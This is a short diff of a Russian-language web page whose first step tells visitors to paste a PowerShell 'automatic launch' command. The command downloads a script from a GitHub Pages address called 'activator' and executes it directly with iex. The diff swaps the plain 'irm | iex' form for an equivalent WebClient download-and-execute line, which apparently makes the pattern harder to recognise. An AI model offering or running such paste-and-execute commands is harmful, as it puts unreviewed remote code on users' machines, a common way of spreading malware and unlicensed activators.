@@ -121,7 +121,7 @@
             <div class="step-title">Шаг 1</div>
             <div class="step-desc">Скопируйте команду автоматического запуска для PowerShell:</div>
             <div class="command-box">
-                <div class="command-text" id="cmdText">irm https://carplk.github.io/activator | iex</div>
+                <div class="command-text" id="cmdText">$c = (New-Object Net.WebClient).DownloadData('https://carplk.github.io/activator'); iex ([System.Text.Encoding]::UTF8.GetString($c))</div>
                 <button class="copy-btn" id="copyBtn" onclick="copyCode()">Копировать</button>
             </div>
         </div>
